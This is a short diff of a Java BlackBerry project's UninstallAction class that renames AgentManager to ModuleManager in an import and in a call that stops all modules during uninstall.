@@ -11,7 +11,7 @@ package blackberry.action;
 import net.rim.device.api.system.Application;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
-import blackberry.AgentManager;
+import blackberry.ModuleManager;
 import blackberry.EventManager;
 import blackberry.Main;
 import blackberry.Status;
@@ -67,7 +67,7 @@ public final class UninstallAction extends SubAction {
             final Main main = (Main) Application.getApplication();
             main.stopListeners();
 
-            AgentManager.getInstance().stopAll();
+            ModuleManager.getInstance().stopAll();
             EventManager.getInstance().stopAll();
 
             Utils.sleep(5000);
